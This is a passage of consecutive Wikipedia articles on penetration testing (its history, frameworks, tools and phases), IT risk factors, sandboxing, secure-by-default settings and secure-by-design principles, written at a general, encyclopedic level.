The process typically identifies the target systems and a particular goal, then reviews available information and undertakes various means to attain that goal. A penetration test target may be a white box (about which background and system information are provided in advance to the tester) or a black box (about which only basic information—if any—other than the company name is provided). A gray box penetration test is a combination of the two (where limited knowledge of the target is shared with the auditor).[7] A penetration test can help identify a system's vulnerabilities to attack and estimate how vulnerable it is.[8][6]
Security issues that the penetration test uncovers should be reported to the system owner.[9] Penetration test reports may also assess potential impacts to the organization and suggest countermeasures to reduce the risk.[9]
The UK National Cyber Security Center describes penetration testing as: "A method for gaining assurance in the security of an IT system by attempting to breach some or all of that system's security, using the same tools and techniques as an adversary might."[10]
The goals of a penetration test vary depending on the type of approved activity for any given engagement, with the primary goal focused on finding vulnerabilities that could be exploited by a nefarious actor, and informing the client of those vulnerabilities along with recommended mitigation strategies.[11]
Penetration tests are a component of a full security audit. For example, the Payment Card Industry Data Security Standard requires penetration testing on a regular schedule, and after system changes.[12] Penetration testing also can support risk assessments as outlined in the  NIST Risk Management Framework SP 800-53.[13]
Several standard frameworks and methodologies exist for conducting penetration tests. These include the Open Source Security Testing Methodology Manual (OSSTMM), the Penetration Testing Execution Standard (PTES), the NIST Special Publication 800-115, the Information System Security Assessment Framework (ISSAF) and the OWASP Testing Guide.  CREST, a not for profit professional body for the technical cyber security industry, provides its CREST Defensible Penetration Test standard that provides the industry with guidance for commercially reasonable assurance activity when carrying out penetration tests. [14]
Flaw hypothesis methodology is a systems analysis and penetration prediction technique where a list of hypothesized flaws in a software system are compiled through analysis of the specifications and documentation for the system. The list of hypothesized flaws is then prioritized on the basis of the estimated probability that a flaw actually exists, and on the ease of exploiting it to the extent of control or compromise. The prioritized list is used to direct the actual testing of the system. 
There are different types of penetration testing, depending upon the goal of the organization which include: Network (external and internal), Wireless, Web Application, Social Engineering, and Remediation Verification.


History[edit]
By the mid 1960s, growing popularity of time-sharing computer systems that made resources accessible over communication lines created new security concerns. As the scholars Deborah Russell and G. T. Gangemi Sr. explain, "The 1960s marked the true beginning of the age of computer security."[15]: 27 
In June 1965, for example, several of the U.S.'s leading computer security experts held one of the first major conferences on system security—hosted by the government contractor, the System Development Corporation (SDC). During the conference, someone noted that one SDC employee had been able to easily undermine various system safeguards added to SDC's AN/FSQ-32 time-sharing computer system. In hopes that further system security study would be useful, attendees requested "...studies to be conducted in such areas as breaking security protection in the time-shared system." In other words, the conference participants initiated one of the first formal requests to use computer penetration as a tool for studying system security.[16]: 7–8 
At the Spring 1967 Joint Computer Conference, many leading computer specialists again met to discuss system security concerns. During this conference, the computer security experts Willis Ware, Harold Petersen, and Rein Turn, all of the RAND Corporation, and Bernard Peters of the National Security Agency (NSA), all used the phrase "penetration" to describe an attack against a computer system. In a paper, Ware referred to the military's remotely accessible time-sharing systems, warning that "Deliberate attempts to penetrate such computer systems must be anticipated." His colleagues Petersen and Turn shared the same concerns, observing that online communication systems "...are vulnerable to threats to privacy," including "deliberate penetration." Bernard Peters of the NSA made the same point, insisting that computer input and output "...could provide large amounts of information to a penetrating program." During the conference, computer penetration would become formally identified as a major threat to online computer systems.[16]: 8 
The threat that computer penetration posed was next outlined in a major report organized by the United States Department of Defense (DoD) in late 1967. Essentially, DoD officials turned to Willis Ware to lead a task force of experts from NSA, CIA, DoD, academia, and industry to formally assess the security of time-sharing computer systems. By relying on many papers presented during the Spring 1967 Joint Computer Conference, the task force largely confirmed the threat to system security that computer penetration posed. Ware's report was initially classified, but many of the country's leading computer experts quickly identified the study as the definitive document on computer security.[16] Jeffrey R. Yost of the Charles Babbage Institute has more recently described the Ware report as "...by far the most important and thorough study on technical and operational issues regarding secure computing systems of its time period."[17] In effect, the Ware report reaffirmed the major threat posed by computer penetration to the new online time-sharing computer systems.
To better understand system weaknesses, the federal government and its contractors soon began organizing teams of penetrators, known as tiger teams, to use computer penetration to test system security. Deborah Russell and G. T. Gangemi Sr. stated that during the 1970s "...'tiger teams' first emerged on the computer scene. Tiger teams were government and industry-sponsored teams of crackers who attempted to break down the defenses of computer systems in an effort to uncover, and eventually patch, security holes."[15]: 29 
A leading scholar on the history of computer security, Donald MacKenzie, similarly points out that, "RAND had done some penetration studies (experiments in circumventing computer security controls) of early time-sharing systems on behalf of the government."[18][19] Jeffrey R. Yost of the Charles Babbage Institute, in his own work on the history of computer security, also acknowledges that both the RAND Corporation and the SDC had "engaged in some of the first so-called 'penetration studies' to try to infiltrate time-sharing systems in order to test their vulnerability."[17] In virtually all these early studies, tiger teams successfully broke into all targeted computer systems, as the country's time-sharing systems had poor defenses.
Of early tiger team actions, efforts at the RAND Corporation demonstrated the usefulness of penetration as a tool for assessing system security. At the time, one RAND analyst noted that the tests had "...demonstrated the practicality of system-penetration as a tool for evaluating the effectiveness and adequacy of implemented data security safeguards." In addition, a number of the RAND analysts insisted that the penetration test exercises all offered several benefits that justified its continued use. As they noted in one paper, "A penetrator seems to develop a diabolical frame of mind in his search for operating system weaknesses and incompleteness, which is difficult to emulate." For these reasons and others, many analysts at RAND recommended the continued study of penetration techniques for their usefulness in assessing system security.[16]: 9 
Presumably the leading computer penetration expert during these formative years was James P. Anderson, who had worked with the NSA, RAND, and other government agencies to study system security. In the early 1971, the U.S. Air Force contracted Anderson's private company to study the security of its time-sharing system at the Pentagon. In his study, Anderson outlined a number of major factors involved in computer penetration. Anderson described a general attack sequence in steps:

Find an exploitable vulnerability.
Design an attack around it.
Test the attack.
Seize a line in use.
Enter the attack.
Exploit the entry for information recovery.
Over time, Anderson's description of general computer penetration steps helped guide many other security experts, who relied on this technique to assess time-sharing computer system security.[16]: 9 
In the following years, computer penetration as a tool for security assessment became more refined and sophisticated. In the early 1980s, the journalist William Broad briefly summarized the ongoing efforts of tiger teams to assess system security. As Broad reported, the DoD-sponsored report by Willis Ware had "...showed how spies could actively penetrate computers, steal or copy electronic files and subvert the devices that normally guard top-secret information. The study touched off more than a decade of quiet activity by elite groups of computer scientists working for the Government who tried to break into sensitive computers. They succeeded in every attempt."[20]
While these various studies may have suggested that computer security in the U.S. remained a major problem, the scholar Edward Hunt has more recently made a broader point about the extensive study of computer penetration as a security tool. Hunt suggests in a recent paper on the history of penetration testing that the defense establishment ultimately "...created many of the tools used in modern day cyberwarfare," as it carefully defined and researched the many ways that computer penetrators could hack into targeted systems.[16]: 5 

Tools[edit]
A wide variety of security assessment tools are available to assist with penetration testing, including free-of-charge, free software, and commercial software.

Specialized OS distributions[edit]
Several operating system distributions are geared towards penetration testing.[21] Such distributions typically contain a pre-packaged and pre-configured set of tools. The penetration tester does not have to hunt down each individual tool, which might increase the risk of complications—such as compile errors, dependency issues, and configuration errors. Also, acquiring additional tools may not be practical in the tester's context.
Notable penetration testing OS examples include:

BlackArch based on Arch Linux
BackBox based on Ubuntu
Kali Linux (replaced BackTrack December 2012) based on Debian
Parrot Security OS based on Debian
Pentoo based on Gentoo
WHAX based on Slackware
Many other specialized operating systems facilitate penetration testing—each more or less dedicated to a specific field of penetration testing.
A number of Linux distributions include known OS and application vulnerabilities, and can be deployed as targets to practice against. Such systems help new security professionals try the latest security tools in a lab environment. Examples include Damn Vulnerable Linux (DVL), the OWASP Web Testing Environment (WTW), and Metasploitable.

Software frameworks[edit]
BackBox
Hping
Metasploit Project
Nessus
Nmap
OWASP ZAP
SAINT
w3af
Penetration testing phases[edit]
The process of penetration testing may be simplified into the following five phases:

Reconnaissance: The act of gathering important information on a target system. This information can be used to better attack the target. For example, open source search engines can be used to find data that can be used in a social engineering attack.
Scanning: Uses technical tools to further the attacker's knowledge of the system. For example, Nmap can be used to scan for open ports.
Gaining access: Using the data gathered in the reconnaissance and scanning phases, the attacker can use a payload to exploit the targeted system. For example, Metasploit can be used to automate attacks on known vulnerabilities.
Maintaining access: Maintaining access requires taking the steps involved in being able to be persistently within the target environment in order to gather as much data as possible.
Covering tracks: The attacker must clear any trace of compromising the victim system, any type of data gathered, log events, in order to remain anonymous.[22]
Once an attacker has exploited one vulnerability they may gain access to other machines so the process repeats i.e. they look for new vulnerabilities and attempt to exploit them. This process is referred to as pivoting.

Vulnerabilities[edit]
Legal operations that let the tester execute an illegal operation include unescaped SQL commands, unchanged hashed passwords in source-visible projects, human relationships, and old hashing or cryptographic functions. A single flaw may not be enough to enable a critically serious exploit. Leveraging multiple known flaws and shaping the payload in a way that appears as a valid operation is almost always required. Metasploit provides a ruby library for common tasks, and maintains a database of known exploits.
When working under budget and time constraints, fuzzing is a common technique that discovers vulnerabilities. It aims to get an unhandled error through random input. The tester uses random input to access the less often used code paths. Well-trodden code paths are usually free of errors. Errors are useful because they either expose more information, such as HTTP server crashes with full info trace-backs—or are directly usable, such as buffer overflows.
Imagine a website has 100 text input boxes. A few are vulnerable to SQL injections on certain strings. Submitting random strings to those boxes for a while will hopefully hit the bugged code path. The error shows itself as a broken HTML page half rendered because of an SQL error. In this case, only text boxes are treated as input streams. However, software systems have many possible input streams, such as cookie and session data, the uploaded file stream, RPC channels, or memory. Errors can happen in any of these input streams. The test goal is to first get an unhandled error and then understand the flaw based on the failed test case. Testers write an automated tool to test their understanding of the flaw until it is correct. After that, it may become obvious how to package the payload so that the target system triggers its execution. If this is not viable, one can hope that another error produced by the fuzzer yields more fruit. The use of a fuzzer saves time by not checking adequate code paths where exploits are unlikely.

Payload[edit]
The illegal operation, or payload in Metasploit terminology, can include functions for logging keystrokes, taking screenshots, installing adware, stealing credentials, creating backdoors using shellcode, or altering data. Some companies maintain large databases of known exploits and provide products that automatically test target systems for vulnerabilities:

Metasploit
Nessus
Nmap
OpenVAS
W3af
Standardized government penetration test services[edit]
The General Services Administration (GSA) has standardized the "penetration test" service as a pre-vetted support service, to rapidly address potential vulnerabilities, and stop adversaries before they impact US federal, state and local governments. These services are commonly referred to as Highly Adaptive Cybersecurity Services (HACS) and are listed at the US GSA Advantage website.[23]
This effort has identified key service providers which have been technically reviewed and vetted to provide these advanced penetration services.  This GSA service is intended to improve the rapid ordering and deployment of these services, reduce US government contract duplication, and to protect and support the US infrastructure in a more timely and efficient manner.
132-45A Penetration Testing[24] is security testing in which service assessors mimic real-world attacks to identify methods for circumventing the security features of an application, system, or network. HACS Penetration Testing Services typically strategically test the effectiveness of the organization's preventive and detective security measures employed to protect assets and data.  As part of this service, certified ethical hackers typically conduct a simulated attack on a system, systems, applications or another target in the environment, searching for security weaknesses. After testing, they will typically document the vulnerabilities and outline which defenses are effective and which can be defeated or exploited.
In the UK penetration testing services are standardized via professional bodies working in collaboration with National Cyber Security Centre.
The outcomes of penetration tests vary depending on the standards and methodologies used. There are five penetration testing standards: Open Source Security Testing Methodology Manual[25] (OSSTMM), Open Web Application Security Project (OWASP), National Institute of Standards and Technology (NIST00), Information System Security Assessment Framework (ISSAF), and Penetration Testing Methodologies and Standards (PTES).

See also[edit]
IT risk
ITHC
Tiger team
White hat (computer security)
General references[edit]
Long, Johnny (2011). Google Hacking for Penetration Testers, Elsevier[26]
The Definitive Guide to Penetration Testing[27]
References[edit]


^ "What Is Penetration Testing?". Retrieved 2018-12-18.

^ "Penetration Testing overview". Retrieved 2019-01-25.

^ "What's the difference between a vulnerability assessment and a penetration test?". Retrieved 2020-05-21.

^ The CISSP® and CAPCM Prep Guide: Platinum Edition. John Wiley & Sons. 2006-11-06. ISBN 978-0-470-00792-1. A penetration test can determine how a system reacts to an attack, whether or not a system's defenses can be breached, and what information can be acquired from the system

^ Kevin M. Henry (2012). Penetration Testing: Protecting Networks and Systems. IT Governance Ltd. ISBN 978-1-849-28371-7. Penetration testing is the simulation of an attack on a system, network, piece of equipment or other facility, with the objective of proving how vulnerable that system or "target" would be to a real attack.

^ a b Cris Thomas (Space Rogue), Dan Patterson (2017). Password Cracking is easy with IBM's Space Rogue (Video). CBS Interactive.  Event occurs at 4:30-5:30. Retrieved 1 December 2017.

^ "Pen Testing Types explained". 2017-06-09. Retrieved 2018-10-23.

^ "Penetration Testing: Assessing Your Overall Security Before Attackers Do". SANS Institute. Retrieved 16 January 2014.

^ a b "Writing a Penetration Testing Report". SANS Institute. Retrieved 12 January 2015.

^ "Penetration Testing". NCSC. Aug 2017. Retrieved 30 October 2018.

^ Patrick Engebretson, The basics of hacking and penetration testing Archived 2017-01-04 at the Wayback Machine, Elsevier, 2013

^ Alan Calder and Geraint Williams (2014). PCI DSS: A Pocket Guide, 3rd Edition. ISBN 978-1-84928-554-4. network vulnerability scans at least quarterly and after any significant change in the network

^ "NIST Risk Management Framework". NIST. 2020.

^ "CREST releases guidance on penetration testing". IntelligentCISO. 2022.

^ a b Russell, Deborah; Gangemi, G.T. (1991). Computer Security Basics. O'Reilly Media Inc. ISBN 9780937175712.

^ a b c d e f Hunt, Edward (2012). "US Government Computer Penetration Programs and the Implications for Cyberwar". IEEE Annals of the History of Computing. 34 (3): 4–21. doi:10.1109/MAHC.2011.82. S2CID 16367311.

^ a b Yost, Jeffrey R. (2007).  de Leeuw, Karl; Bergstra, Jan (eds.). A History of Computer Security Standards, in The History of Information Security: A Comprehensive Handbook. Elsevier. pp. 601–602.

^ Mackenzie, Donald; Pottinger, Garrel (1997). "Mathematics, Technology, and Trust: Formal Verification, Computer Security, and the U.S. Military". IEEE Annals of the History of Computing. 19 (3): 41–59. doi:10.1109/85.601735.

^ Mackenzie, Donald A. (2004). Mechanizing Proof: Computing, Risk, and Trust. Massachusetts Institute of Technology. p. 156. ISBN 978-0-262-13393-7.

^ Broad, William J. (September 25, 1983). "Computer Security Worries Military Experts", The New York Times

^ Faircloth, Jeremy (2011). "Chapter 1:Tools of the Trade" (PDF). Penetration Tester's Open Source Toolkit (Third ed.). Elsevier. ISBN 978-1597496278. Retrieved 4 January 2018.[need quotation to verify]

^ "Summarizing The Five Phases of Penetration Testing - Cybrary". Cybrary. 2015-05-06. Retrieved 2018-06-25.

^ "GSA HACS SIN 132-45 Services". 1 March 2018. Archived from the original on 23 March 2019. Retrieved 1 March 2018.

^ "Pen Testing Services". 1 March 2018. Archived from the original on 26 June 2018. Retrieved 1 March 2018.

^ "Open-Source Security Testing Methodology Manual - an overview | ScienceDirect Topics". www.sciencedirect.com. Retrieved 2021-10-13.

^ Long, Johnny (2011). Google Hacking for Penetration Testers. Elsevier Science. ISBN 978-0-08-048426-6.

^ "Definitive Guide to Penetration Testing | Core Sentinel". Core Sentinel. Retrieved 2018-10-23.


Authority control: National libraries 
Israel
United States
Latvia





Retrieved from "https://en.wikipedia.org/w/index.php?title=Penetration_test&oldid=1134910981"
Categories: Security testingComputer network securitySoftware testingHidden categories: Webarchive template wayback linksWikipedia articles needing factual verification from May 2013Articles with short descriptionShort description matches WikidataWikipedia introduction cleanup from December 2021All pages needing cleanupArticles covered by WikiProject Wikify from December 2021All articles covered by WikiProject WikifyUse American English from January 2014All Wikipedia articles written in American EnglishArticles with J9U identifiersArticles with LCCN identifiersArticles with LNB identifiers
 



From Wikipedia, the free encyclopedia


This article is about Information security. For other uses, see risk factor (disambiguation).
In information security, risk factor is a collective name for circumstances affecting the likelihood or impact of a security risk.


Definitions[edit]
FAIR[edit]
Main article: Factor Analysis of Information Risk § Risk
Factor Analysis of Information Risk (FAIR) is devoted to the analysis of different factors influencing IT risk. It decompose at various levels, starting from the first level Loss Event Frequency and Probable Loss Magnitude, going on examining the asset, the threat agent capability compared to the vulnerability (computing) and the security control (also called countermeasure) strength, the probability that the agent get in contact and actually act against the asset, the organization capability to react to the event and the impact on stakeholders.

ISACA[edit]
Risk factors are those factors that influence the frequency and/or business impact of risk scenarios; they can be of different natures, and can be classified in two major categories:[1]

Environmental, further subdivided in:
Internal environmental factors are, to a large extent, under the control of the enterprise, although they may not always be easy to change.
External environmental factors are, to a large extent, outside the control of the enterprise.
Capability of the organization, further subdivided in:
IT risk management capabilities—To what extent is the enterprise mature in performing the risk management processes defined in the Risk IT framework
IT capabilities—How good is the enterprise at performing the IT processes defined in COBIT
IT-related business capabilities (or value management)—How closely do the enterprise’s value management activities align with those expressed in the Val IT processes
Risk scenario[edit]
An IT risk risk scenario is a description of an IT related event that can lead to a business impact, when and if it should occur.
Risk factors can also be interpreted as causal factors of the scenario that is materialising, or as vulnerabilities or weaknesses. These are terms often used in risk management frameworks.[1]
Risk scenario is characterized by:[1]

a threat actor that can be:
Internal to the organization (employee, contractor)
External to the organization (competitor, business partner, regulator, act of god)
a threat type
Malicious,
Accidental
Failure
Natural
Event
Disclosure,
Modification
Theft
Destruction
Bad design
ineffective execution
inappropriate use
asset or resource
People and organization
Process
Infrastructure or facilities
IT infrastructure
Information
Application
Time
Duration
Timing of occurrence (critical or not)
Timing to detect
Timing to react
The risk scenario structure differentiates between loss events (events generating the negative impact), vulnerabilities or vulnerability events
(events contributing to the magnitude or frequency of loss events occurring), and threat events (circumstances or events that can trigger loss
events). It is important not to confuse these risks or throw them into one large risk list.[2]

See also[edit]
Asset
Attack (computing)
Countermeasure (computer)
Computer security
Computer insecurity
Information Security
Information security management
ISACA
Information security management system
ISO/IEC 27001
IT risk
Risk
Risk Management
The Open Group
Threat (computer)
Security control
Security risk
Security service (telecommunication)
Vulnerability (computing)
References[edit]


^ a b c ISACA THE RISK IT FRAMEWORK (registration required)

^ "An Introduction to Factor Analysis of Information Risk (FAIR)", Risk Management Insight LLC, November 2006 Archived 2014-11-18 at the Wayback Machine;






Retrieved from "https://en.wikipedia.org/w/index.php?title=Risk_factor_(computing)&oldid=1081145224"
Categories: Computer securityRisk analysisHidden categories: Webarchive template wayback links
 



From Wikipedia, the free encyclopedia


Software security mechanism
This article is about the computer security mechanism. For the software testing environment, see Sandbox (software development).
In computer security, a sandbox is a security mechanism for separating running programs, usually in an effort to mitigate system failures and/or software vulnerabilities from spreading. The isolation metaphor is taken from the idea of children who do not play well together, so each is given their own sandbox to play in alone.  It is often used to execute untested or untrusted programs or code, possibly from unverified or untrusted third parties, suppliers, users or websites, without risking harm to the host machine or operating system.[1]  A sandbox typically provides a tightly controlled set of resources for guest programs to run in, such as storage and memory scratch space. Network access, the ability to inspect the host system, or read from input devices are usually disallowed or heavily restricted.
In the sense of providing a highly controlled environment, sandboxes may be seen as a specific example of virtualization. Sandboxing is frequently used to test unverified programs that may contain a virus or other malicious code without allowing the software to harm the host device.[2]


Implementations[edit]
A sandbox is implemented by executing the software in a restricted operating system environment, thus controlling the resources (e.g. file descriptors, memory, file system space, etc.) that a process may use.[3]
Examples of sandbox implementations include the following:

Linux application sandboxing, built on Seccomp, cgroups and Linux namespaces. Notably used by Systemd, Google Chrome, Firefox, Firejail.
Android was the first mainstream operating system to implement full application sandboxing, built by assigning each application its own Linux user ID.[4]
Apple App Sandbox is required for apps distributed through Apple's Mac App Store and iOS/iPadOS App Store, and recommended for other signed apps.[5][6]
Windows Vista and later editions include a "low" mode process running, known as "User Account Control" (UAC), which only allows writing in a specific directory and registry keys. Windows 10 Pro, from version 1903, provides a feature known as Windows Sandbox.[7]
Google Sandboxed API.[8]
Virtual machines emulate a complete host computer, on which a conventional operating system may boot and run as on actual hardware.  The guest operating system runs sandboxed in the sense that it does not function natively on the host and can only access host resources through the emulator.
A jail: network-access restrictions, and a restricted file system namespace. Jails are most commonly used in virtual hosting.[9]
Rule-based execution gives users full control over what processes are started, spawned (by other applications), or allowed to inject code into other applications and have access to the net, by having the system assign access levels for users or programs according to a set of determined rules.[10] It also can control file/registry security (what programs can read and write to the file system/registry). In such an environment, viruses and Trojans have fewer opportunities for infecting a computer.  The SELinux and Apparmor security frameworks are two such implementations for Linux.
Security researchers rely heavily on sandboxing technologies to analyse malware behavior. By creating an environment that mimics or replicates the targeted desktops, researchers can evaluate how malware infects and compromises a target host. Numerous malware analysis services are based on the sandboxing technology.[11]
Google Native Client is a sandbox for running compiled C and C++ code in the browser efficiently and securely, independent of the user's operating system.[12]
Capability systems can be thought of as a fine-grained sandboxing mechanism, in which programs are given opaque tokens when spawned and have the ability to do specific things based on what tokens they hold. Capability-based implementations can work at various levels, from kernel to user-space.  An example of capability-based user-level sandboxing involves HTML rendering in a Web browser.
Secure Computing Mode (seccomp)  strict mode, seccomp only allows the write(), read(), exit(), and sigreturn() system calls.
HTML5 has a "sandbox" attribute for use with iframes.[13]
Java virtual machines include a sandbox to restrict the actions of untrusted code, such as a Java applet.
The .NET Common Language Runtime provides Code Access Security to enforce restrictions on untrusted code.
Software Fault Isolation (SFI),[14] allows running untrusted native code by sandboxing all store, read and jump assembly instructions to isolated segments of memory.
Some of the use cases for sandboxes include the following:

Online judge systems to test programs in programming contests.
New-generation pastebins allowing users to execute pasted code snippets on the pastebin's server.
See also[edit]
Sandboxie
seccomp
Shade sandbox
Test bench
Tor (anonymity network)
References[edit]


^ Goldberg, Ian; Wagner, David; Thomas, Randi & Brewer, Eric (1996). "A Secure Environment for Untrusted Helper Applications (Confining the Wily Hacker)" (PDF). Proceedings of the Sixth USENIX UNIX Security Symposium. Retrieved 25 October 2011.

^ Geier, Eric (2012-01-16). "How to Keep Your PC Safe With Sandboxing". TechHive. Retrieved 2014-07-03.

^ "Sandboxing Applications" (PDF). 2001. Retrieved 7 May 2013.

^ "Application Sandbox - Android Open Source Project". Retrieved 2021-04-02.

^ "About App Sandbox". developer.apple.com. Retrieved 2020-12-09.

^ "Security of runtime process in iOS and iPadOS". Apple Support. Retrieved 2021-04-04.

^ "Windows Sandbox". 2018-12-18. Retrieved 2010-01-07.

^ google/sandboxed-api, Google, 2020-12-08, retrieved 2020-12-09

^ "Auto-Sandboxing secure system". Retrieved 2015-01-30.

^ "Computer System Security and Access Controls". 1991. Archived from the original on 28 May 2013. Retrieved 17 May 2013.

^ "Native Client Sandbox – Untrusted x86 Native Code" (PDF). Retrieved 2015-01-03.

^ Welcome to Native Client

^ Internet Explorer Team Blog. "Defense in Depth: Locking Down Mash-Ups with HTML5 Sandbox". IEBlog.

^ Wahbe, Robert (1993). "Efficient Software-Based Fault Isolation" (PDF).


External links[edit]
Security In-Depth for Linux Software: Preventing and Mitigating Security Bugs
Sandbox –  The Chromium Projects
FreeBSD capsicum(4) man page –  a lightweight OS capability and sandbox framework
OpenBSD pledge(2) man page –  a way to restrict system operations
Sandbox testing importance{sandbox} Importance of sandbox in zero day flaw




Retrieved from "https://en.wikipedia.org/w/index.php?title=Sandbox_(computer_security)&oldid=1125699459"
Categories: Operating system securityVirtualizationHidden categories: Articles with short descriptionShort description is different from Wikidata
 



From Wikipedia, the free encyclopedia


Security by default, in software
This article does not cite any sources. Please help improve this article by adding citations to reliable sources. Unsourced material may be challenged and removed.Find sources: "Secure by default" – news · newspapers · books · scholar · JSTOR (August 2017) (Learn how and when to remove this template message)
Security by default, in software, means that the default configuration settings are the most secure settings possible, which are not necessarily the most user-friendly settings. In many cases, security and user-friendliness are evaluated based on both risk analysis and usability tests. This leads to the discussion of what the most secure settings are. As a result, the precise meaning of "secure by default" remains undefined.
In a network operating system, this typically means first and foremost that there are no listening INET(6) domain sockets after installation; that is, no open network ports. This can be checked on the local machine with a tool like netstat and remotely with a port scanner such as nmap.  As a general rule, a secure network is only as secure as the least secure node in the entire network.
If a program uses secure configuration settings by default, the user will be better protected.[citation needed] However, not all users consider security[citation needed] and may be obstructed by secure settings. A common example is whether or not blank passwords are allowed for login. Not everyone can, or is willing to, type or memorize a password.[citation needed]
Another way to secure a program or system is through abstraction, where the user has presented an interface in which the user cannot (or is discouraged to) cause (accidental) data loss. This, however, can lead to less functionality or reduced flexibility.[citation needed] Having user control preferences does not typically cause this but at the cost of having a larger part of the user interface for configuration controls.
Some servers or devices that have an authentication system, have default usernames and passwords. If not properly changed, anyone who knows the default configuration can successfully authenticate. For non-unique defaults, this practice would violate the principle of 'security by default'.

Operating systems[edit]
OpenBSD claims to be the only operating system that is fully secure by default. This, however, does not mean it is inherently the most secure operating system. This is because that depends on the definition of an operating system. There are many operating systems that are not capable of networking with other systems, and when considering the amount of network-based security compromises today, one can argue such an operating system is more secure. OpenBSD is a network operating system.
Ubuntu is a Linux distribution aimed at desktop users that hides the administrative account by default and only allows the first user to gain administrative privileges for certain system tasks (such as installing system updates, and managing disk drives). macOS does not hide this account, but users with limited rights can still fully utilise the system.[citation needed]
Microsoft Windows and Linspire have been criticised[citation needed] for allowing the user to have administrative privileges without warning—a potential threat to the system. Windows Vista and subsequent versions of Windows attempt to remedy this situation through its User Account Control system.

See also[edit]
Security-focused operating system
Usability
Default (computer science)
Secure by design
Authentication




Retrieved from "https://en.wikipedia.org/w/index.php?title=Secure_by_default&oldid=1082425134"
Categories: Computer security proceduresOperating system securityHidden categories: Articles with short descriptionShort description matches WikidataArticles lacking sources from August 2017All articles lacking sourcesAll articles with unsourced statementsArticles with unsourced statements from March 2007
 



From Wikipedia, the free encyclopedia


Software engineering approach
This article contains instructions, advice, or how-to content. The purpose of Wikipedia is to present facts, not to train. Please help improve this article either by rewriting the how-to content or by moving it to Wikiversity, Wikibooks or Wikivoyage. (June 2022)
Part of a series onInformation security
Related security categories
Computer security
Automotive security
Cybercrime
Cybersex trafficking
Computer fraud
Cybergeddon
Cyberterrorism
Cyberwarfare
Electronic warfare
Information warfare
Internet security
Mobile security
Network security
Copy protection
Digital rights management

Threats
Adware
Advanced persistent threat
Arbitrary code execution
Backdoors
Hardware backdoors
Code injection
Crimeware
Cross-site scripting
Cryptojacking malware
Botnets
Data breach
Drive-by download
Browser helper objects
Viruses
Data scraping
Denial of service
Eavesdropping
Email fraud
Email spoofing
Exploits
Keyloggers
Logic bombs
Time bombs
Fork bombs
Zip bombs
Fraudulent dialers
Malware
Payload
Phishing
Polymorphic engine
Privilege escalation
Ransomware
Rootkits
Bootkits
Scareware
Shellcode
Spamming
Social engineering
Screen scraping
Spyware
Software bugs
Trojan horses
Hardware Trojans
Remote access trojans
Vulnerability
Web shells
Wiper
Worms
SQL injection
Rogue security software
Zombie

Defenses
Application security
Secure coding
Secure by default
Secure by design
Misuse case
Computer access control
Authentication
Multi-factor authentication
Authorization
Computer security software
Antivirus software
Security-focused operating system
Data-centric security
Code obfuscation
Data masking
Encryption
Firewall
Intrusion detection system
Host-based intrusion detection system (HIDS)
Anomaly detection
Security information and event management (SIEM)
Mobile secure gateway
Runtime application self-protection
vte
Secure by design, in software engineering, means that software products and capabilities have been designed to be foundationally secure.
Alternate security strategies, tactics and patterns are considered at the beginning of a software design, and the best are selected and enforced by the architecture, and they are used as guiding principles for developers.[1] It is also encouraged to use strategic design patterns that have beneficial effects on security, even though those design patterns were not originally devised with security in mind.[2]
Secure by Design is increasingly becoming the mainstream development approach to ensure security and privacy of software systems. In this approach, security is considered and built into the system at every layer and starts with a robust architecture design. Security architectural design decisions are based on well-known security strategies, tactics, and patterns defined as reusable techniques for achieving specific quality concerns. Security tactics/patterns provide solutions for enforcing the necessary authentication, authorization, confidentiality, data integrity, privacy, accountability, availability, safety and non-repudiation requirements, even when the system is under attack.[3]
In order to ensure the security of a software system, not only is it important to design a robust intended security architecture but it is also necessary to map updated security strategies, tactics and patterns to software development in order to maintain security persistence.


Expect attacks[edit]
Malicious attacks on software should be assumed to occur, and care is taken to minimize impact.  Security vulnerabilities are anticipated, along with invalid user input.[4] Closely related is the practice of using "good" software design, such as domain-driven design or cloud native, as a way to increase security by reducing risk of vulnerability-opening mistakes—even though the design principles used were not originally conceived for security purposes.

Avoid security through obscurity[edit]
Generally, designs that work well do not rely on being secret. Often, secrecy reduces the number of attackers by demotivating a subset of the threat population. The logic is that if there is an increase in complexity for the attacker, the increased attacker effort to compromise the target will discourage them. While this technique implies reduced inherent risks, a virtually infinite set of threat actors and techniques applied over time will cause most secrecy methods to fail. While not mandatory, proper security usually means that everyone is allowed to know and understand the design because it is secure. This has the advantage that many people are looking at the computer code, which improves the odds that any flaws will be found sooner (see Linus's law). The disadvantage is that attackers can also obtain the code, which makes it easier for them to find vulnerabilities to exploit. It is generally believed, though, that the advantage of the open computer code outweighs the disadvantage.

Fewest privileges[edit]
Also, it is important that everything works with the fewest privileges possible (see the principle of least privilege). For example, a web server that runs as the administrative user ("root" or "admin") can have the privilege to remove files and users. A flaw in such a program could therefore put the entire system at risk, whereas a web server that runs inside an isolated environment, and only has the privileges for required network and filesystem functions, cannot compromise the system it runs on unless the security around it in itself is also flawed.

Methodologies[edit]
Secure Design should be a consideration at all points in the development lifecycle (whichever development methodology is chosen).
Some pre-built Secure By Design development methodologies exist (e.g. Microsoft Security Development Lifecycle).

Microsoft Security Development Lifecycle[edit]
Main article: Microsoft Security Development Lifecycle
Microsoft issued methodology and guidance based on the classical spiral model.

Standards and Legislation[edit]
Main article: Application security § Security standards and regulations
Standards and Legislation exist to aide secure design by controlling the definition of "Secure", and providing concrete steps to testing and integrating secure systems.
Some examples of standards which cover or touch on Secure By Design principles:

ETSI TS 103 645 [5] which is included in part in the UK Government "Proposals for regulating consumer smart product cyber security" [6]
ISO/IEC 27000-series covers many aspects of secure design.
Server/client architectures[edit]
In server/client architectures, the program at the other side may not be an authorised client and the client's server may not be an authorised server. Even when they are, a man-in-the-middle attack could compromise communications.
Often the easiest way to break the security of a client/server system is not to go head on to the security mechanisms, but instead to go around them.  A man in the middle attack is a simple example of this, because you can use it to collect details to impersonate a user.  Which is why it is important to consider encryption, hashing, and other security mechanisms in your design to ensure that information collected from a potential attacker won't allow access.
Another key feature to client-server security design is good coding practices.  For example, following a known software design structure, such as client and broker, can help in designing a well-built structure with a solid foundation.  Furthermore, if the software is to be modified in the future, it is even more important that it follows a logical foundation of separation between the client and server.  This is because if a programmer comes in and cannot clearly understand the dynamics of the program, they may end up adding or changing something that can add a security flaw.  Even with the best design, this is always a possibility, but the better the standardization of the design, the less chance there is of this occurring.

See also[edit]
Computer security
Cyber security standards
Hardening
Multiple Independent Levels of Security
Secure by default
Security through obscurity
Software Security Assurance
References[edit]


